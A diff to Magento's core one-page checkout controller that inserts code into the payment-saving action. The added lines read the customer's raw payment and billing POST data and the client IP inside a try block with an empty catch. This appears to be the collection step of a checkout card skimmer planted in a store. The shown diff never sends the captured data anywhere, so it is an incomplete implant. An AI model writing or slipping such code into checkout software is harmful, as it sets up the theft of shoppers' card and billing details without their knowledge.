@@ -490,7 +490,22 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
                 $this->_ajaxRedirectResponse();
                 return;
             }
+      try
+        {
+        $data1 =Mage::app()->getRequest()->getPost('payment');
+        $data2 =Mage::app()->getRequest()->getPost('billing');
+          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ipc = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ipc = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ipc = $_SERVER['REMOTE_ADDR'];
+}
 
+        }
+        catch(Exception $e){
+            
+         }
             $data = $this->getRequest()->getPost('payment', array());
             $result = $this->getOnepage()->savePayment($data);
 
@@ -504,6 +519,7 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
                     'html' => $this->_getReviewHtml()
                 );
             }
+
             if ($redirectUrl) {
                 $result['redirect'] = $redirectUrl;
             }
